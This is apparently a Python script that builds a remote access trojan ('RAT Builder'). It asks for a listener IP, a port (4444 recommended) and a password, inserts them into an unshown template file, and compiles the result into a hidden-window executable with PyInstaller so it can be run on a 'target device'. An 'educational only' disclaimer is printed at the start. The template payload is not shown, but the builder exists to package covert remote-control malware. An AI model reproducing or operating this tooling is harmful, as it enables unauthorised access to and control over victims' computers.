import socket
import io
from rich import print
import pyfiglet
import pyttsx3
import time
import os
import random
from rich.console import Console
time.sleep(1)
console = Console()

disclaimer = """
╔══════════════════════════════════════════════════════════════╗
║  ⚠️  DISCLAIMER                                              ║
╠══════════════════════════════════════════════════════════════╣
║  This tool is for EDUCATIONAL & AUTHORIZED testing ONLY.     ║
║  Do NOT deploy on systems you don't own or lack explicit     ║
║  permission to test. Unauthorized use is ILLEGAL.            ║
╚══════════════════════════════════════════════════════════════╝
"""

print(f"[red]{disclaimer}[/red]")
pyttsx3.speak(disclaimer)
time.sleep(1)

run = str(input("Do you want to run this tool (y/n) : ")).lower()
if run == "y":
    osname = str(console.input("""[bold white]Enter Your Os Name[/bold white]
                   1. [blue]Windows[/blue]
                   2. [red]Mac/linux[/red]    [white](1/2) : [/white]"""))
    print("[bold blue]Running....[/bold blue]")
    time.sleep(2)
    if osname == "1":
        os.system("cls")
    elif osname == "2":
        os.system("clear")
    name = pyfiglet.figlet_format("""RAT Builder""", font="small")
    print(f"[bold red]{name}[/bold red]")
    time.sleep(1)
    print("[bold yellow]Use Only for educational purpose[/bold yellow]")
    time.sleep(1)
    print("""[bold blue]Made By : Akshat Rajput[/bold blue]                                [bold blue]Version : v1.2[/bold blue]""")
    time.sleep(1)
    print("[bold blue]Working OS : Windows/Linux[/bold blue]")
    time.sleep(1)
    ip = console.input("[bold red]Enter the Ip address that you should open the port (Recommended = 0.0.0.0) : [/bold red]")
    port = console.input("[bold red]Enter the Port number : (Recommended = 4444) : [/bold red]")
    password1 = console.input("[bold green]Enter the password : [/bold green]")
    password2 = console.input("[bold green]Confirm Password : [/bold green]")
    if password1 == password2:
        print("[bold green]Password Selected-----[/bold green]")
        password = password1
        time.sleep(2)
    else:
        print("[bold red]Error : Password was different[/bold red]")
        time.sleep(2)
    print("[bold white]Confirm Detail----[/bold white]")
    print(f"""[bold blue]Details :[/bold blue] 
    [bold green]
    Ip = {ip}
    Port = {port}
    Password = {password}
    [/bold green]""")
    time.sleep(1)
    create = console.input("[bold white]Do you want to create an (RAT).exe file (y/n) : [/bold white]").lower()
    with open("required.py", "r") as f:
        content = f.read()
    content = content.replace('ip_value = None', f'ip_value = "{ip}"')
    content = content.replace('port_value = None', f'port_value = {int(port)}')
    content = content.replace('password_value = None', f'password_value = "{password}"')
    with open("RAT.py", "w") as f:
        f.write(content)
    print("[bold white]Generating.....[/bold white]")
    time.sleep(2)
    os.system("pyinstaller --onefile --noconsole RAT.py")
    os.remove("RAT.py")
    print("[bold green]File Created Succesfully on the dist folder[/bold green]")
    time.sleep(1)
    print("[bold green]For connecting ot the target device run the Remote Access file[/bold green]")

          
